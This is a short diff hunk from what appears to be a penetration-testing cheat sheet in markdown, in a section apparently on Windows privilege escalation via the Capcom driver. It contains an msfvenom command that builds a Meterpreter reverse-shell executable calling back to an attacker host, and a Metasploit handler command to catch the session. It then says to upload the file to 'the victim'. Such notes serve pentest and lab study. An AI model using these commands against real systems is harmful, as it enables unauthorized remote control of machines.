@@ -1506,7 +1506,7 @@ cat drivers.txt | Select-String -pattern Capcom
 - create revershell with msfvenom and then name it as revshell.exe and put that in
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=443 -f exe -o revshell.exe
-sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.1; set LPORT 443; set EXITONSESSION false; set EXITFUNC thread; run -j"
+sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.1; set LPORT 443; set EXITONSESSION false; set EXITFUNC thread; run"
 ```
 
 then upload revshell.exe to the victim and : 
